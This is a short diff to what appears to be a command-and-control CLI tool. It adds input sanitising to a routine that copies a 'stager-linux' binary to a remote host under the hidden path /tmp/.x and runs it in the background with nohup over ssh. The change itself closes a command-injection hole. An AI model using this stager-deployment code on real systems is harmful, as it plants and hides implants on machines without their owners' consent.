@@ -616,12 +616,13 @@ export function createC2Command(): Command {
       const remotePath = opts.remotePath ?? "/tmp/.x";
       const identityArg = opts.key ? `-i ${opts.key}` : "";
       const stagerPath = "/tmp/stager-linux";
+      const sanitizedUserHost = userHost.replace(/[^a-zA-Z0-9_.-]/g, '');
 
       console.log(`  ${picocolors.cyan("==>")} Copying stager to ${picocolors.white(userHost)}:${remotePath}...`);
 
       try {
         execSync(
-          `scp ${identityArg} -P ${sshPort} -q ${stagerPath} "${userHost}:${remotePath}"`,
+          `scp ${identityArg} -P ${sshPort} -q ${stagerPath} "${sanitizedUserHost}:${remotePath}"`,
           { stdio: "inherit", cwd: projectRoot, timeout: 30_000 },
         );
       } catch {
@@ -633,7 +634,7 @@ export function createC2Command(): Command {
 
       try {
         execSync(
-          `ssh ${identityArg} -p ${sshPort} "${userHost}" "chmod +x ${remotePath} && nohup ${remotePath} >/dev/null 2>&1 &"`,
+          `ssh ${identityArg} -p ${sshPort} "${sanitizedUserHost}" "chmod +x ${remotePath} && nohup ${remotePath} >/dev/null 2>&1 &"`,
           { stdio: "inherit", cwd: projectRoot, timeout: 15_000 },
         );
       } catch {
